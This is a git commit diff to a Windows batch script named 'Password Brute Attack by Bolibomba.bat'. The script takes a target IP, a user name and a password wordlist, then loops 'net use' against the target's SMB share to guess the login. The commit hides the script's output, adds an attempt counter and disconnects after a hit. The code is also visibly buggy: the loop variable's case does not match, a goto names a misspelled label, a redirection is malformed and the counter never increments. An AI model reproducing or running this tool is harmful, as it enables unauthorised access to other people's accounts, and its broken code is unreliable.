337bd0b2c4599d5cce332f58de3007f68f4198b1
Bolibomba-dev <hjalleswedenhammar@gmail.com>
2025-03-07 17:00:38 +0100

    Password Brute Attack by Bolibomba.bat

--- Password Brute Attack by Bolibomba.bat
+++ Password Brute Attack by Bolibomba.bat
@@ -6,7 +6,7 @@ set /p ip="Enter IP Address: "
 set /p user="Enter User: "
 set /p wordlist="Enter Password List:"
 
-
+set /a count=0
 for /f %%a in (%wordlist%) do (
 set pass=%%A
 call :attempt
@@ -16,9 +16,10 @@ pause
 exit
 :success
 echo Password Found : %pass%
+net use \\%ip% /d/y >nul 2>&1
 pause
 exit
 :attempt
-net use \\%ip% /user:%user% %pass%
-echo attempt: %pass%
+net use \\%ip% /user:%user% %pass% >nul>&1
+echo [ATTEMPT &count%]: [%pass%]
 if %errorlevel% EQU 0 goto succes
